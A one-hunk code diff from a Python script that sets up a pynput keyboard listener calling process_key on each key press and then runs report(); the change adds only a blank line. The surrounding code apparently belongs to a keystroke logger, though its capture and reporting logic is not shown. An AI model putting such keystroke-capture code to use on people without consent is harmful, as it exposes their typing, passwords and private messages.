@@ -27,4 +27,5 @@ key_listener =pynput.keyboard.Listener(on_press=process_key)
 
 with key_listener:
     report()
+
     key_listener.join()
